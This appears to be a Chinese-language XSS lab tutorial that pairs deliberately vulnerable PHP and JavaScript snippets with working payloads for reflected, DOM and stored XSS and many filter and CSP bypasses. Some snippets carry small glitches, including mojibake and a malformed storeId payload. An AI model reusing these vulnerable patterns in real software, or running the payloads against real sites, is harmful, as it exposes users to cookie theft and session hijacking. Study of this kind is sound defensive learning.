# 手撕 CVE 漏洞：XSS 类型、绕过技巧与利用实战全解
## XSS 类型
### 反射型
#### 定义
反射型 XSS，也称为非持久型 XSS，其核心特点是：恶意脚本作为 HTTP 请求的一部分被发送到服务器，服务器在响应中“原样反射”回这些脚本，并在用户的浏览器中执行
#### 漏洞源码
后端直接接收 name 参数并输出到页面中，没有任何过滤或转义
```php
if (isset($_GET['name'])) {
    $name = $_GET['name'];
    // Vulnerability: No sanitization
    echo "Hello, " . $name . "!";
}
```
#### Payload
```html
<script>alert(document.cookie)</script>
```
成功执行，这一关也可以执行 XSS 平台的 #### Payload 拿到 flag

### DOM 型
#### 定义
DOM 型 XSS 是一种特殊类型的XSS攻击，其特点是：
● 恶意代码的执行完全在客户端的浏览器中发生，不涉及服务器响应内容的修改
● 攻击向量（#### Payload）通过修改页面的 DOM 树结构来实现
● 服务器响应的原始 HTML 可能是"干净"的，但客户端的 JavaScript 代码不安全地处理了数据，导致了漏洞
#### 漏洞源码
JS 从 URL 获取 keyword 参数并写入 innerHTML
```javascript
if (keyword) {
  const container = document.getElementById('result');
  container.innerHTML = "Search results for: " + keyword;
  const scripts = container.getElementsByTagName('script');
  for (let i = 0; i < scripts.length; i++) {
    const script = document.createElement('script');
    if (scripts[i].src) {
      script.src = scripts[i].src;
    } else {
      script.text = scripts[i].innerText;
    }
    document.body.appendChild(script);
  }
} else {
  document.getElementById('result').innerText = "No keyword provided. Try adding ?keyword=test to the URL.";
}
```
#### Payload
```html
?keyword=<script>alert(document.cookie)</script>
```

### 存储型
#### 定义
存储型 XSS，也称为持久型 XSS，其核心特点是：
●  恶意脚本被永久存储在服务器上（数据库、文件系统、缓存等） 
● 每当用户访问受感染的页面时，恶意代码都会自动执行
● 无需用户点击特定链接，只需访问正常页面即可触发
#### 漏洞源码
用户的评论被保存到 JSON 文件中，读取时未经过 htmlspecialchars 处理直接输出
```php
file_put_contents($file, json_encode($data));
foreach (array_reverse($comments) as $c):
  echo $c['text'];
endforeach;
```
#### Payload
```html
<script>alert(document.cookie)</script>
```

## XSS 绕过
### 双引号绕过
#### 漏洞源码
输入被输出到了 `<input>` 标签的 value 属性中，且由双引号包裹。但后端未对双引号进行转义
```html
<form method="GET" action="">
    <?php
        $keyword = isset($_GET['keyword']) ? $_GET['keyword'] : 'Try to break me';
    ?>
    <label>Search:</label>
    <input type="text" name="keyword" value="<?php echo $keyword; ?>">
    <button type="submit">Search</button>
    <button type="button" onclick="window.location.href='index.php'" style="background: #ff3333; margin-left: 5px;">Clear Input</button>
</form>
```
#### 绕过思路
闭合前面的双引号，添加事件属性，注释掉后面的内容
#### Payload
```html
" onclick="alert(document.cookie)"
```

### JavaScript 伪协议绕过
#### 漏洞源码
后端使用 str_ireplace 将 `<script` 替换为 `<scr_ipt`，这阻止了直接使用 `<script>` 标签，但未过滤其他的 HTML 标签
```php
<?php
if (isset($_GET['keyword'])) {
    $str = $_GET['keyword'];
    $str = str_ireplace("<script", "<scr_ipt", $str);
    echo "Result: " . $str;
}
?>
```
#### 绕过思路
利用不需要 <script> 标签的 #### Payload
#### Payload
```html
<a href="javascript:alert(document.cookie)">Click</a>
```

### 单引号绕过
#### 漏洞源码
后端过滤了双引号 `"`，但 HTML 源码中使用**单引号** `'` 包裹属性值
```html
<form method="GET" action="">
    <?php
        $keyword = isset($_GET['keyword']) ? $_GET['keyword'] : '';
        $keyword_safe = str_replace('"', '&quot;', $keyword);
    ?>
    <label>Search:</label>
    <input type="text" name="keyword" value='<?php echo $keyword_safe; ?>'>
    <button type="submit">Search</button>
    <button type="button" onclick="window.location.href='index.php'" style="background: #ff3333; margin-left: 5px;">Clear Input</button>
</form>
```
#### 绕过思路
利用 HTML 解析的宽容性，使用单引号闭合属性
#### Payload
```html
' onclick='alert(document.cookie)
```

### 双写绕过
#### 漏洞源码
后端将敏感关键词替换为空字符串，且只执行了一次替换（非递归）
```php
if (isset($_GET['keyword'])) {
    $str = strtolower($_GET['keyword']);
    $bad_words = ['script', 'on', 'src', 'data', 'href'];
    foreach ($bad_words as $word) {
        $str = str_replace($word, '', $str);
    }
    $str = $_GET['keyword'];
    $str = str_ireplace($bad_words, '', $str);
    echo "Result: <input value=\"" . $str . "\">";
}
```
#### 绕过思路
双写关键词。例如 script 被替换为空，那么 scrscriptipt 中间的 script 消失后，两边的字符会重新拼合
#### Payload
```html
"><scrscriptipt>alert(document.cookie)</scrscriptipt>
```

### Unicode 编码绕过
#### 漏洞源码
后端替换了大量关键词，并转义了双引号。但是输入点在 href 属性中
```php
if (isset($_GET['keyword'])) {
    $str = strtolower($_GET['keyword']);
    $str = str_replace("script", "scr_ipt", $str);
    $str = str_replace("on", "o_n", $str);
    $str = str_replace("src", "sr_c", $str);
    $str = str_replace("data", "da_ta", $str);
    $str = str_replace("href", "hr_ef", $str);
    $str = str_replace("javascript", "java_script", $str);
    $str = htmlspecialchars($str); 
    $str = $_GET['keyword'];
    $str = str_replace("script", "scr_ipt", $str);
    $str = str_replace("on", "o_n", $str);
    $str = str_replace("src", "sr_c", $str);
    $str = str_replace("data", "da_ta", $str);
    $str = str_replace("href", "hr_ef", $str);
    $str = str_replace("javascript", "\"java_script\"", $str);
    $str = str_replace('"', '&quot;', $str);
    echo '<a href="' . $str . '">Your Link</a>';
}
```
#### 绕过思路
利用 HTML 实体编码。浏览器在解析属性值时会自动解码实体
#### Payload
```html
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;
```

### 双写+注释绕过
#### 漏洞源码
输入必须包含 `http://`，script 关键词被替换为空
```php
if (isset($_GET['keyword'])) {
$str = $_GET['keyword'];
$str = str_ireplace("script", "", $str); 
if (strpos($str, 'http://') === false) {
    echo '<p style="color:red;">Error: Invalid URL. Must contain http://</p>';
} else {
    echo '<a href="' . $str . '">Your Link</a>';
}
}
```
#### 绕过思路
构造包含 `http://` 的 #### Payload，同时利用双写绕过 script 清洗
利用 JS 注释 `//` 来隐藏 `http://`
#### Payload
```html
javascrscriptipt:alert(document.cookie)//http://
```

### 大小写绕过
#### 漏洞源码
后端使用大小写敏感的 str_replace 过滤了全小写的 javascript
```php
if (isset($_GET['keyword'])) {
    $str = $_GET['keyword'];
    $str = str_replace("javascript", "", $str);
    $str = str_replace("script", "", $str);
    echo '<a href="' . $str . '">Your Link</a>';
}
```
#### 绕过思路
利用浏览器对协议解析的大小写不敏感特性
#### Payload
```html
JavaScript:alert(document.cookie)
```

### JS 字符串拼接绕过
#### 漏洞源码
输入被放置在 JS 变量的单引号字符串中
```php
if (isset($_GET['keyword'])) {
    $str = $_GET['keyword'];
    $str_safe = str_replace(['<', '>'], ['&lt;', '&gt;'], $str);
    echo "var t_str = '$str_safe';";
    echo "\n            document.write('Current Search: ' + t_str);";
} else {
    echo "var t_str = 'Guest';";
}
```
#### 绕过思路
利用 JS 字符串拼接的特性，构造出包含 XSS Payload 的字符串
闭合前面的单引号，使用分号结束语句，执行 Payload，注释掉后面的内容
#### Payload
```html
';alert(document.cookie);//
```

### IMG 标签绕过
#### 漏洞源码
JS 使用正则 `/ <script|javascript:/i` 对输入进行了检测。如果通过，则写入 `innerHTML`
```html
<script>
    function processInput() {
        const urlParams = new URLSearchParams(window.location.search);
        const keyword = urlParams.get('keyword');
        if (keyword) {
            const blacklist = /<script|javascript:/i;
            if (blacklist.test(keyword)) {
                document.getElementById('result').innerText = "馃毇 Malicious content detected!";
                document.getElementById('result').style.color = "red";
            } else {
                document.getElementById('result').innerHTML = "Results: " + keyword;
            }
        }
    }
    processInput();
</script>
```
#### 绕过思路
正则只拦截了 `<script` 和 `javascript:`。但 `innerHTML` 还支持其他大量的 XSS 向量，如 `<img>`, `<iframe>`, `<svg>` 等
#### Payload
```html
<img src=x onerror=alert(document.cookie)>
```

### URL 编码绕过
#### 漏洞源码
后端对输入进行了 `urlencode`，看起来很安全，`%`、`'`、`<` 等都会被编码
但前端使用了危险的 Sink：
```javascript
var decodedUrl = decodeURIComponent(currentUrl);
setTimeout('console.log("' + decodedUrl + '")', 100);
```
`setTimeout` 的第一个参数如果是字符串，会像 `eval` 一样执行代码。且执行前先进行了解码
```php
if (isset($_GET['keyword'])) {
    $str = $_GET['keyword'];
    if (preg_match("/['\"<>]/", $str)) {
        $str = str_replace(['\'', '"', '<', '>'], '_', $str);
    }
    $encoded = urlencode($str);
    echo "var rawInput = '$encoded';";
    echo "\n            // Legacy System: Two rounds of decoding";
    echo "\n            var step1 = decodeURIComponent(rawInput);";
    echo "\n            var step2 = decodeURIComponent(step1);";
    echo "\n            setTimeout('console.log(\"Log: ' + step2 + '\")', 100);";
}
```
#### 绕过思路
后端使用 `preg_match` 拦截了 `'`、`"`、`<`、`>`。如果直接输入 `';alert(1);//`，会被拦截并替换为 `_`
WAF 检查通过后，后端使用 `urlencode` 对字符串进行了编码（例如 `'` 变成 `%27`）
前端代码为了兼容旧数据，执行了**两次** `decodeURIComponent`
代码中的 Sink 是 `setTimeout('console.log("Log: ' + step2 + '")', 100);`
这里使用了双引号 `"` 来包裹日志内容，所以我们需要闭合双引号
输入 `%22` (即 `"`)绕过 WAF 检查
```
urlencode('%22')` -> `%2522`
decodeURIComponent('%2522')` -> `%22`
decodeURIComponent('%22')` -> `"`
```
`setTimeout` 中字符串被闭合，代码执行
#### Payload
```javascript
%22);alert(document.cookie);//
```

### AngularJS 模板注入 XSS
#### 漏洞源码
```php
<?php
if (isset($_GET['keyword'])) {
    $str = $_GET['keyword'];
    $safe_html = htmlspecialchars($str);
    echo "<div id='result'>Hello, $safe_html</div>";
}
?>
```
#### 绕过思路
因为输出点在 `ng-app` 作用域内，AngularJS 会扫描并解析 `{{ ... }}` 语法。虽然 HTML 标签被转义了，但 `{{` 和 `}}` 没有被转义
在 AngularJS 的表达式沙箱中，通常直接访问 `window` 或 `document` 是被禁止的。但是，我们可以访问对象的 `constructor` 属性
`constructor.constructor`：
    第一个 `constructor` 获取当前上下文对象的构造函数
    第二个 `constructor` 获取该构造函数的构造函数，这通常就是 JavaScript 原生的 `Function` 构造函数
    `Function` 构造函数允许我们将字符串当作代码来创建新的函数（类似于 `eval`）
`('alert(document.cookie)')`：这是传给 `Function` 构造函数的参数，即我们要执行的恶意代码
#### Payload
```javascript
{{constructor.constructor('alert(1)')()}}
```

### Data 伪协议 + postMessage XSS
#### 漏洞源码
后端过滤了 `iframe` src 中的 `javascript:`，但允许 `data:`
iframe 加载 `data:` 协议内容后，源变为 `null`，无法直接访问父页面 DOM
```php
if (isset($_GET['keyword'])) {
    $str = $_GET['keyword'];
    $str = str_ireplace("javascript", "", $str);
    echo '<iframe src="' . htmlspecialchars($str) . '" width="100%" height="100"></iframe>';
} else {
    echo '<iframe src="about:blank" width="100%" height="100"></iframe>';
}
```
但父页面有一个监听 `message` 事件的 Handler，且直接将接收到的数据写入 `innerHTML`
```javascript
window.addEventListener('message', function(e) {
    console.log("Received message:", e.data);
    document.getElementById('message-output').innerHTML = "Received: " + e.data;
});
```
#### 绕过思路
构造一个 `data:` 协议的 iframe，在其中运行 JS，通过 `parent.postMessage()` 发送 XSS #### Payload 给父页面
#### Payload
```php
data:text/html,<script>parent.postMessage('<img src=x onerror=alert(1)>', '*')</script>
```

### JSONP 绕过 CSP
#### 漏洞源码
启用了一个严格的 CSP：只允许同源脚本，禁止 inline 脚本
这意味着 `<script>alert(1)</script>` 无法执行
```php
if (isset($_GET['callback'])) {
    header('Content-Type: application/javascript');
    $cb = $_GET['callback'];
    echo $cb . '({"status": "ok", "time": "' . date('Y-m-d H:i:s') . '"});';
    exit;
}
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';");
```
但是，同源下有一个 JSONP 端点（`?callback=...`），它会返回 JavaScript 代码
```html
<div style="margin-top:20px; font-size:0.8em; color:#666;">
    Debug: API available at <a href="?callback=test">?callback=test</a>
</div>
```
#### 绕过思路
利用 CSP 允许的同源脚本源（'self'），我们可以加载这个 JSONP 端点作为脚本，并控制 callback 参数来执行任意 JS
#### Payload
```javascript
<script src="?callback=alert(1)"></script>
```

### 非全局替换绕过
#### 漏洞源码
后端负责接收评论并存储到 JSON 文件中。**没有任何过滤或转义逻辑**
前端负责获取评论并在页面上显示。开发者使用了一个 `escapeHTML` 函数来转义危险字符
```javascript
function escapeHTML(html) {
    if (!html) return '';
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
const safeText = escapeHTML(comment.text);
item.innerHTML = `... <div class="comment-body">${safeText}</div> ...`;
```
#### 绕过思路
JavaScript 的 `String.prototype.replace(search, replacement)` 方法有一个特性：
    如果 search 参数是一个字符串（而不是带有全局标志 g 的正则表达式），它只会替换第一个匹配项
利用这个特性，我们可以在 Payload 前面，故意放置一组或多组“废弃”的危险字符
#### Payload
```html
<><img src=x onerror=alert(document.cookie)>
```

### body onresize 绕过
#### 漏洞源码
后端定义了庞大的标签和属性黑名单
```php
$blocked_tags = ['script', 'img', 'iframe', ...]; // 包含绝大多数常见标签
$blocked_attributes = ['onload', 'onerror', 'onclick', ...]; // 包含绝大多数常见事件
if (preg_match("/<\s*$tag\b/i", $input_lower)) { die("Tag Not Allowed"); }
```
#### 绕过思路
面对黑名单 WAF，首要任务是**Fuzzing**，找出哪些标签和属性是被允许的。我们可以发现 `<body>` 和 `onresize`
我们需要构造一个 Payload，利用 `<body>` 标签和 `onresize` 事件
#### Payload
```html
<body onresize=alert(document.cookie)>
```

### svg animatetransform onbegin 绕过
#### 漏洞源码
后端定义了庞大的标签和属性黑名单
```php
$blocked_tags = ['svg', 'animateTransform', ...]; // 包含绝大多数常见标签
$blocked_attributes = ['onbegin', 'onend', 'onclick', ...]; // 包含绝大多数常见事件
if (preg_match("/<\s*$tag\b/i", $input_lower)) { die("Tag Not Allowed"); }
```
#### 绕过思路
面对黑名单 WAF，首要任务是**Fuzzing**，找出哪些标签和属性是被允许的。我们可以发现 `<svg>` 和 `animateTransform`
我们需要构造一个 Payload，利用 `<svg>` 标签和 `animateTransform` 事件
`<svg>` 标签可以包含 `<animate>` 或 `<animateTransform>` 等动画标签
这些动画标签支持 `onbegin` 事件（动画开始时触发）
#### Payload
```html
<svg><animatetransform onbegin=alert(document.cookie)>
```

### link accesskey 绕过
#### 漏洞源码
本关卡模拟了一个 SEO 优化场景，页面包含一个指向自身的 `<link rel="canonical">` 标签
由于单引号未被转义，我们可以使用单引号 `'` 闭合 `href` 属性，然后注入其他属性
```php
$host = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$raw_request_uri = $_SERVER['REQUEST_URI'];
$decoded_request_uri = urldecode($raw_request_uri);
$current_url = $protocol . "://" . $host . $decoded_request_uri;
$safe_url = htmlspecialchars($current_url); 
echo "<link rel='canonical' href='$safe_url'>";
```
#### 绕过思路
虽然 `<link>` 标签通常不可见，但我们可以利用 `accesskey` 属性配合 `onclick` 事件
`accesskey="x"`：定义激活元素的快捷键（Windows 下通常是 `Alt + Shift + X`）
`onclick="alert(document.cookie)"`：当元素被激活（点击或快捷键）时触发
#### Payload
```html
/?%27accesskey=%27x%27onclick=%27alert(document.cookie)
```

### 

## XSS 实战
### 博客评论区 XSS
#### 漏洞源码
后端使用了 `htmlspecialchars($website, ENT_QUOTES)` 对网站链接进行 HTML 转义
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $author = $_POST['author'] ?? 'Anonymous';
    $website = $_POST['website'] ?? '';
    $comment = $_POST['comment'] ?? '';
    $website_safe = htmlspecialchars($website, ENT_QUOTES); 
    $author_safe = htmlspecialchars($author);
    $comment_safe = htmlspecialchars($comment);
    
    $new_comment = [
        'author' => $author_safe,
        'website' => $website_safe,
        'comment' => $comment_safe,
        'time' => date('Y-m-d H:i:s')
    ];
    
    $current_data = json_decode(file_get_contents($db_file), true);
    $current_data[] = $new_comment;
    file_put_contents($db_file, json_encode($current_data));

    header("Location: index.php");
    exit;
}
```
虽然属性被闭合了，但协议头没有被校验。href 属性天然支持 javascript: 伪协议
```php
if (!empty($comments)) {
    foreach ($comments as $c) {
        echo '<div class="comment">';
        echo '<div class="comment-meta">';

        if (!empty($c['website'])) {
            echo '<span class="comment-author"><a href="' . $c['website'] . '">' . $c['author'] . '</a></span>';
        } else {
            echo '<span class="comment-author">' . $c['author'] . '</span>';
        }
        
        echo ' | ' . $c['time'];
        echo '</div>';
        echo '<div class="comment-body">' . $c['comment'] . '</div>';
        echo '</div>';
    }
} else {
    echo '<p>No comments yet. Be the first!</p>';
}
```
#### 漏洞利用
直接在 Website 字段输入 `javascript:alert(1)`
当其他用户（或管理员）点击评论者的名字时，JS 代码执行

### 选择功能 XSS
#### 漏洞源码
页面使用 `document.write` 动态生成了一个下拉菜单 (`<select>`)
`storeId` 参数从 URL 获取后，直接拼接到 `document.write` 的 HTML 字符串中，且没有进行任何转义
```javascript
var stores = ["London", "Paris", "Milan", "Tokyo", "New York"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if (store) {
    document.write('<option selected>' + store + '</option>');
}
for (var i = 0; i < stores.length; i++) {
    if (stores[i] === store) {
        continue;
    }
    document.write('<option>' + stores[i] + '</option>');
}
document.write('</select>');
```
#### 漏洞利用
在 URL 中添加 `?storeId=img src=x onerror=alert(document.cookie)>`
当页面加载时，JS 代码执行

### 返回连接 XSS
#### 漏洞源码
页面包含一个“返回首页”的链接
JS 代码从 URL 参数 `returnPath` 中获取值，并使用 jQuery 的 `attr()` 方法将其设置为该链接的 `href` 属性
jQuery 的 `attr()` 方法会将传入的值直接赋给属性，且不进行协议检查
```javascript
$(document).ready(function() {
    var params = new URLSearchParams(window.location.search);
    var returnPath = params.get('returnPath');
    
    if (returnPath) {
        $('#backLink').attr('href', returnPath);
    }
});
```
#### 漏洞利用
利用 `href` 属性支持的 `javascript:` 伪协议
将 `returnPath` 参数设置为恶意 JS 代码
```javascript
?returnPath=javascript:alert(document.cookie)
```



### Hash DOM XSS
#### 漏洞源码
后端完全没有处理输入，因为输入是通过 URL Hash (`#`) 传递的，这部分根本不会发送给服务器
前端 JS 读取 `location.hash` 并写入 `innerHTML`
```html
<script>
    function changeTab(tabName) {
        window.location.hash = tabName;
    }
    function loadContentFromHash() {
        var hash = window.location.hash;
        var display = document.getElementById('content-display');
        if (hash) {
            var tab = decodeURIComponent(hash.substring(1));
            display.innerHTML = "Loading content for: <b>" + tab + "</b>...";
            setTimeout(function() {
                if (tab === 'home') display.innerHTML = "<h2>Home Dashboard</h2><p>Welcome back, User.</p>";
                else if (tab === 'profile') display.innerHTML = "<h2>User Profile</h2><p>Name: Hacker<br>Role: Admin</p>";
                else if (tab === 'settings') display.innerHTML = "<h2>System Settings</h2><p>No settings available.</p>";
                else {
                    display.innerHTML = "Error: Tab '<b>" + tab + "</b>' not found.";
                }
            }, 500);
        } else {
            changeTab('home');
        }
    }
    window.addEventListener('hashchange', loadContentFromHash);
    window.addEventListener('load', loadContentFromHash);
</script>
```
#### 漏洞利用
这是一种纯前端的 DOM XSS。由于数据不经过服务器，所有服务端 WAF 都无效
直接构造包含 Payload 的 Hash
```html
#<img src=x onerror=alert(document.cookie)>
```

### JavaScript 表达式 XSS
#### 漏洞源码
输入被反射在 JavaScript 对象的属性值中，被单引号包裹
后端使用了 `htmlspecialchars($q, ENT_COMPAT)`。`ENT_COMPAT` (默认模式) 仅编码双引号 `"`，**不编码单引号 `'`**
```javascript
var analyticsData = {
    sessionId: "sess_<?php echo uniqid(); ?>",
    timestamp: <?php echo time(); ?>,
    searchTerm: '<?php echo isset($_GET['q']) ? htmlspecialchars($_GET['q'], ENT_COMPAT) : ''; ?>',
    category: 'general'
};
```
#### 漏洞利用
利用 JavaScript 表达式 `''-alert(document.cookie)-''` 执行 Payload
其插入到源码中则是 `searchTerm: ''-alert(document.cookie)-'',`。在 JavaScript 解释器看来，这是在执行一个数学减法运算
解析结构 ：
JS 引擎把这行代码解析为三个部分，通过减号 - 连接：
    第一部分： '' (空字符串)
    第二部分： alert(document.cookie) (函数调用)
    第三部分： '' (空字符串)
为了计算这个减法表达式的值，JS 引擎必须先求出每一个操作数的值，也就是浏览器必须立即执行 alert(document.cookie) 函数
```html
'-alert(document.cookie)-'
```

### JSON XSS
#### 漏洞源码
##### 服务端
服务端试图通过转义双引号 `"` 来防止跳出 JSON 字符串值。但关键的是，它**没有转义反斜杠 `\`**
```php
header('Content-Type: application/json');
$q = isset($_GET['q']) ? $_GET['q'] : '';
$safe_q = str_replace('"', '\"', $q);
echo '{"results":' . $results_json . ',"searchTerm":"' . $safe_q . '"}';
```
##### 客户端
客户端使用 `eval()` 来解析服务端返回的 JSON 字符串
```javascript
try {
    var searchResultsObj = eval('(' + xhr.responseText + ')');
    displayResults(searchResultsObj);
}
```
#### 漏洞利用
我们需要闭合 JSON 中的字符串。由于服务端将 `"` 转义为 `\"`，我们无法直接使用 `"` 闭合
但是，我们可以输入 `\"`
    我们输入 `\`，服务端不转义，保留为 `\`
    我们输入 `"`，服务端转义为 `\"`
    组合起来，Payload `\"` 变成了 `\\"`
    在 JS 字符串中：
        `\\` 解析为字面量反斜杠 `\`
        `"` 解析为字符串结束引号（因为它前面的反斜杠已经被消耗了，不再起转义作用）
执行流程解析：
    用户输入: `\"-alert(document.cookie)})//`
    服务端处理: `\` 保持不变，`"` 变为 `\"`。结果: `\\"-alert(document.cookie)})//`
    JSON 响应: `{"results":...,"searchTerm":"\\"-alert(document.cookie)})//"}`
    `eval` 执行:
        代码被包裹在括号中: `(` + JSON + `)`
        `"searchTerm":"\\"` -> 字符串值为 `\`
        `-alert(document.cookie)` -> 减去 alert(document.cookie) 的结果 (导致 alert 执行)
        `})` -> 闭合对象和外层括号
        `//` -> 注释掉剩余字符 (即原本的 `"})`)
        最终代码: `({"searchTerm":"\\" -alert(document.cookie)})` -> 合法 JS 代码，执行成功


### 
